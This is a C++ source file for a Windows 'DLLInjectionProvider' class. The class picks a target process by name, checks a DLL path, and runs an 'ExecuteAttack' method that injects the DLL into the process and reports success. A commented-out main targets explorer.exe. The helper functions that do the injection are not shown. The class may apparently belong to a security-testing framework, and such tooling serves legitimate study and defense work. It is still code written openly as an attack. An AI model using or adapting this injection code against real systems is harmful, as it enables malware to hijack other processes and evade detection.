#include <iostream>
#include <Shlwapi.h>
#include "DLLInjectionProvider.h"

BOOL DLLInjectionProvider::SetTargetProcessByName(wstring name) {
    hProcess = GetProcessHandleByName(name);
    if (hProcess == NULL) {
        results += "SetTargetProcessByName() failed. Could not get HANDLE to target process. System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        return FALSE;
    }
    return TRUE;
}

BOOL DLLInjectionProvider::SetTargetDLL(wstring dllPath) {
    if (!PathFileExistsW(dllPath.c_str())) {
        results += "SetTargetDLL() failed. File not found. System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        return FALSE;
    }
    this->dllPath = dllPath;
    return TRUE;
}

BOOL DLLInjectionProvider::ExecuteAttack() {
    if (dllPath == L"" || hProcess == NULL) {
        return FALSE;
    }
    if (LoadDll(hProcess, dllPath.c_str())) {
        results += "The DLL Injection attack was successful\n";
        return TRUE;
    } else {
        results += "The DLL Injection attack failed. System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        return FALSE;
    }
}



// int main() {

//     DLLInjectionProvider a;
//     a.SetTargetProcessByName(L"explorer.exe");
//     a.SetTargetDLL(L"InjectedDLL.dll");
//     a.ExecuteAttack();

//     cout << a.GetAttackResults() << endl;

// }